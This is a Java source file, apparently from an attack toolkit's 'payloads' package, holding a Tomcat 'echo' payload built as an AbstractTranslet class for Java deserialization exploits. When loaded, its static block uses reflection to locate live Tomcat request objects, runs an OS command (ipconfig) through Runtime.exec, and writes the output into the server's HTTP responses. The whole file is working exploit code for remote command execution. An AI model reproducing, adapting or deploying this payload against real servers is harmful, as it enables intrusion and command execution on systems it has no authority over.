package com.Jasetol.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.coyote.RequestInfo;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class echoForTomcat01 extends AbstractTranslet {
    static {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[]) threadsField.get(threadGroup);
            for (int i = 0 ; i < threads.length ; i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Field targetField = Class.forName("java.lang.Thread").getDeclaredField("target");
                        targetField.setAccessible(true);
                        Object nioEndpoint$Poller = targetField.get(thread);
                        Field this$0 = nioEndpoint$Poller.getClass().getDeclaredField("this$0");
                        this$0.setAccessible(true);
                        Object nioEndpoint = this$0.get(nioEndpoint$Poller);
                        Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
                        for (Class<?> aClass : AbstractProtocol_list) {
                            if (aClass.getName().length()==52){
                                java.lang.reflect.Method getHandlerMethod = org.apache.tomcat.util.net.NioEndpoint.class.getMethod("getHandler",null);
                                getHandlerMethod.setAccessible(true);
                                Field globalField = aClass.getDeclaredField("global");
                                globalField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(nioEndpoint, null));
                                Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                                processors.setAccessible(true);
                                java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);
                                Field req1 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                                req1.setAccessible(true);
                                for (RequestInfo requestInfo : RequestInfo_list) {
                                    org.apache.coyote.Request request1 = (org.apache.coyote.Request )req1.get(requestInfo);
                                    org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);
                                    org.apache.catalina.connector.Response response2 = request2.getResponse();
                                    Process process = Runtime.getRuntime().exec("ipconfig");
                                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                    StringBuffer stringBuffer = new StringBuffer();
                                    String lineData;
                                    while ((lineData = bufferedReader.readLine()) != null){
                                        stringBuffer.append(lineData + '\n');
                                    }

                                    response2.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
                                    response2.getOutputStream().flush();
                                    response2.getOutputStream().close();
                                }
                            }
                        }
                    }
                }
            }
        }catch (Exception e){}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
